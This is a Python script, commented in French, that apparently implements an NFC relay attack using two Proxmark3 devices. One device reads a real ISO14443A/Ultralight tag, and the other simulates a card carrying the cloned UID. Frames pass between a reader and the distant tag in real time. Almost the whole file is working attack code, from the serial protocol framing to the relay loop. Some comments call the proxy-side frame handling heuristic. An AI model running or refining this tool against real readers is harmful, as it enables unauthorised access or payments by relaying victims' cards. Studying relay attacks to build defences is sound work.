#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 x2  (firmware Iceman v4.20728)
Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur

Stratégie :
  - MOLE  : reader actif, champ maintenu, on lui envoie des commandes RAW
  - PROXY : on utilise aussi le mode reader RAW pour répondre au téléphone
            (le téléphone doit être en mode card emulation / NFC Tools tag emulation)

  Alternative si le téléphone est en mode READER (ce qui est le cas avec NFC Tools) :
  - PROXY simule une carte (CMD_HF_ISO14443A_SIM)
  - Le proxy capture les trames du lecteur via les réponses CMD_HF_ISO14443A_SIM
    qui arrivent de manière asynchrone avec cmd=0x0381 ou cmd=0xFF00
"""

import serial
import struct
import time
import sys

# ── Constantes protocole PM3 ──────────────────────────────────────────────────
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50

CMD_PING                = 0x0109
CMD_HF_ISO14443A_READER = 0x0385
CMD_HF_ISO14443A_SIM    = 0x0381

# Flags ISO14443A
ISO14A_CONNECT      = (1 << 0)   # anticollision + select
ISO14A_NO_DISCONNECT= (1 << 1)   # garder le champ actif
ISO14A_RAW          = (1 << 3)   # bytes bruts
ISO14A_APPEND_CRC   = (1 << 4)   # ajouter CRC auto
ISO14A_NO_SELECT    = (1 << 5)   # pas d'anticollision
ISO14A_NO_RATS      = (1 << 7)   # pas de RATS (pour Ultralight)

DEFAULT_TIMEOUT = 3.0
RELAY_TIMEOUT   = 0.3   # court pour minimiser la latence

# ── Bas niveau ────────────────────────────────────────────────────────────────

def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b'', label=''):
    """Frame MIX : ng_bit=0, 3x uint64 args + data."""
    payload   = struct.pack('<QQQ', arg0, arg1, arg2) + data
    length_ng = len(payload) & 0x7FFF   # ng_bit = 0
    pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += payload
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    if label:
        print(f"  [{label}] >> cmd=0x{cmd:04X} arg0=0x{arg0:08X} arg1={arg1} data={data.hex()}")
    ser.write(pkt)
    ser.flush()


def send_ng_cmd(ser, cmd, data=b'', label=''):
    """Frame NG pure : ng_bit=1."""
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    pkt = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += data
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    if label:
        print(f"  [{label}] >> cmd=0x{cmd:04X} data={data.hex()}")
    ser.write(pkt)
    ser.flush()


def read_response(ser, timeout=DEFAULT_TIMEOUT, label='', silent=False):
    """Lire une réponse PM3. Retourne dict ou None."""
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if label and not silent:
                print(f"  [{label}] << TIMEOUT ({len(raw)}/10)")
            return None
        c = ser.read(10 - len(raw))
        if c:
            raw += c

    magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', raw)
    length = length_ng & 0x7FFF
    ng_bit = (length_ng >> 15) & 1

    if magic != RESPONSENG_PREAMBLE_MAGIC:
        if label and not silent:
            print(f"  [{label}] << BAD MAGIC 0x{magic:08X}")
        ser.reset_input_buffer()
        return None

    payload = b''
    if length > 0:
        dl = time.time() + 2.0
        while len(payload) < length and time.time() < dl:
            payload += ser.read(length - len(payload))

    ser.read(2)  # postamble

    args = (0, 0, 0)
    data_out = payload
    if not ng_bit and len(payload) >= 24:
        args = struct.unpack('<QQQ', payload[:24])
        data_out = payload[24:]

    if label and not silent:
        print(f"  [{label}] << cmd=0x{cmd:04X} st={status} ng={ng_bit} "
              f"args=({args[0]},{args[1]},{args[2]}) len={len(data_out)} data={data_out[:32].hex()}")

    return {'cmd': cmd, 'status': status, 'ng': ng_bit,
            'args': args, 'data': data_out, 'payload': payload}

# ── Parsing iso14a_card_select_t ──────────────────────────────────────────────
# struct iso14a_card_select_t {
#   uint8_t  uid[10];      // offset 0
#   uint8_t  uidlen;       // offset 10
#   uint8_t  atqa[2];      // offset 11
#   uint8_t  sak;          // offset 13
#   uint8_t  ats_len;      // offset 14
#   uint8_t  ats[256];     // offset 15
# } = 271 bytes total

def parse_card_select(data):
    """Parser la structure iso14a_card_select_t (271 bytes)."""
    if len(data) < 15:
        return None
    uid_raw = data[0:10]
    uid_len = data[10]
    atqa    = data[11:13]
    sak     = data[13]
    uid     = uid_raw[:uid_len]
    return {'uid': uid, 'uid_len': uid_len, 'atqa': atqa, 'sak': sak}

# ── Commandes haut niveau ─────────────────────────────────────────────────────

def ping(ser, label=''):
    d = bytes(range(32))
    send_ng_cmd(ser, CMD_PING, d)
    r = read_response(ser, timeout=3.0)
    ok = r and r['data'] == d
    print(f"  [{label}] PING {'OK ✓' if ok else 'FAILED ✗'}")
    return ok


def connect_tag(ser, label=''):
    """Anticollision + select, retourne dict card ou None."""
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=ISO14A_CONNECT | ISO14A_NO_DISCONNECT | ISO14A_NO_RATS,
             label=label)
    resp = read_response(ser, timeout=DEFAULT_TIMEOUT, label=label)
    if not resp:
        return None
    # La structure iso14a_card_select_t est dans resp['data'] (271 bytes)
    card = parse_card_select(resp['data'])
    return card


def raw_to_tag(ser, raw_bytes, label=''):
    """Envoyer bytes bruts au tag (champ actif, CRC ajouté auto)."""
    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=flags,
             arg1=len(raw_bytes),
             data=raw_bytes,
             label=label)
    return read_response(ser, timeout=RELAY_TIMEOUT, label=label)


def raw_to_tag_no_crc(ser, raw_bytes, label=''):
    """Envoyer bytes bruts au tag SANS CRC ajouté (pour certaines commandes)."""
    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=flags,
             arg1=len(raw_bytes),
             data=raw_bytes,
             label=label)
    return read_response(ser, timeout=RELAY_TIMEOUT, label=label)

# ── Relay ─────────────────────────────────────────────────────────────────────

class NfcRelay:

    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0',
                 baudrate=115200, verbose=True):
        self.verbose = verbose
        print(f"[*] Mole  (tag side)    : {mole_port}")
        self.mole  = serial.Serial(mole_port,  baudrate=baudrate, timeout=0.05)
        print(f"[*] Proxy (reader side) : {proxy_port}")
        self.proxy = serial.Serial(proxy_port, baudrate=baudrate, timeout=0.05)
        time.sleep(0.3)
        self._flush()

    def _flush(self):
        self.mole.reset_input_buffer();  self.mole.reset_output_buffer()
        self.proxy.reset_input_buffer(); self.proxy.reset_output_buffer()

    def close(self):
        try: self.mole.close()
        except: pass
        try: self.proxy.close()
        except: pass

    # ── Init ──────────────────────────────────────────────────────────────────

    def init(self):
        print("\n=== Vérification connexions ===")
        if not ping(self.mole, 'MOLE ') or not ping(self.proxy, 'PROXY'):
            return False

        print("\n[MOLE] Recherche du tag réel...")
        card = connect_tag(self.mole, 'MOLE')
        if not card:
            print("[MOLE] ERREUR : aucun tag ! Pose le tag sur le mole.")
            return False

        self.tag_uid  = card['uid']
        self.tag_atqa = card['atqa']
        self.tag_sak  = card['sak']
        print(f"[MOLE] Tag OK  UID={self.tag_uid.hex()}  "
              f"ATQA={self.tag_atqa.hex()}  SAK={self.tag_sak:02X}")

        # Démarrer simulation sur le proxy avec le vrai UID
        print(f"\n[PROXY] Simulation Ultralight, UID={self.tag_uid.hex()}...")
        # Padder UID à 10 bytes pour la commande
        uid_padded = self.tag_uid.ljust(10, b'\x00')[:10]
        send_mix(self.proxy, CMD_HF_ISO14443A_SIM,
                 arg0=2,   # type 2 = ISO14443A-3 / Ultralight
                 arg1=0,
                 data=uid_padded,
                 label='PROXY')
        time.sleep(0.2)
        print("[PROXY] Simulation active.")
        return True

    # ── Relay loop ────────────────────────────────────────────────────────────

    def relay_loop(self):
        """
        Boucle de relai principale.

        Le PM3 en mode simulation (CMD_HF_ISO14443A_SIM) remonte les trames
        reçues du lecteur sous forme de réponses asynchrones.
        Ces réponses ont généralement cmd=0xFF00 (CMD_ACK) ou cmd=0x0381.

        Pour chaque trame reçue du lecteur :
          - on la forward au mole -> tag
          - on récupère la réponse
          - on l'injecte dans la simulation du proxy
        """
        print("\n=== RELAY LOOP ===")
        print("Approche le téléphone (en mode reader NFC) du PROXY.")
        print("Ctrl+C pour arrêter.\n")

        n = 0
        wait_log = 0

        try:
            while True:
                # Lire ce que le proxy reçoit du lecteur
                resp = read_response(self.proxy, timeout=0.02, silent=True)

                if resp is None:
                    wait_log += 1
                    if wait_log % 500 == 0:
                        print("  [~] En attente du lecteur...")
                    continue

                wait_log = 0

                # Afficher toujours ce qui arrive du proxy pour debug
                print(f"\n  [PROXY RAW] cmd=0x{resp['cmd']:04X} st={resp['status']} "
                      f"ng={resp['ng']} args={resp['args']} data={resp['data'][:32].hex()}")

                # Extraire la trame du lecteur
                frame = self._extract_frame(resp)
                if not frame:
                    print("  [PROXY] Réponse sans trame exploitable, ignoré")
                    continue

                n += 1
                print(f"\n=== Échange #{n} ===")
                print(f"  LECTEUR -> PROXY : {frame.hex()}")

                # Forward au tag
                tag_resp = raw_to_tag(self.mole, frame,
                                      label='MOLE' if self.verbose else '')
                if tag_resp and tag_resp['data']:
                    tag_frame = tag_resp['data']
                    print(f"  TAG    -> MOLE   : {tag_frame.hex()}")
                    # Renvoyer au lecteur via le proxy
                    self._reply_to_reader(tag_frame)
                    print(f"  PROXY  -> LECTEUR: {tag_frame.hex()}")
                else:
                    print(f"  TAG    -> MOLE   : (pas de réponse)")

        except KeyboardInterrupt:
            print("\n\n[RELAY] Arrêt.")

    def _extract_frame(self, resp):
        """
        Extraire la trame envoyée par le lecteur depuis la réponse du proxy.
        Le format dépend du firmware - on essaie plusieurs heuristiques.
        """
        d = resp['data']

        # Cas 1 : data directe non vide
        if d and len(d) > 0:
            # Filtrer les réponses "vides" de fin de sim
            if d == bytes(len(d)):  # que des zéros -> ignorer
                return None
            return d

        # Cas 2 : frame MIX, données après les args
        if not resp['ng'] and len(resp['payload']) > 24:
            rest = resp['payload'][24:]
            if rest and rest != bytes(len(rest)):
                return rest

        return None

    def _reply_to_reader(self, data):
        """Injecter une réponse dans la simulation pour la transmettre au lecteur."""
        # On utilise un envoi RAW via le proxy (qui est en sim)
        # En mode sim, on peut injecter une réponse avec CMD_HF_ISO14443A_READER
        # avec les flags appropriés
        flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
        send_mix(self.proxy, CMD_HF_ISO14443A_READER,
                 arg0=flags,
                 arg1=len(data),
                 data=data)
        # Lire l'ACK sans bloquer
        read_response(self.proxy, timeout=0.05, silent=True)

    # ── Run ───────────────────────────────────────────────────────────────────

    def run(self):
        print("\n" + "=" * 62)
        print("  NFC RELAY ATTACK  |  Proxmark3 x2  |  Iceman firmware")
        print("  Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur")
        print("=" * 62)

        if not self.init():
            return
        self.relay_loop()


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == '__main__':
    relay = NfcRelay(
        mole_port  = '/dev/ttyACM1',
        proxy_port = '/dev/ttyACM0',
        verbose    = True
    )
    try:
        relay.run()
    finally:
        relay.close()
        print("[*] Ports fermés.")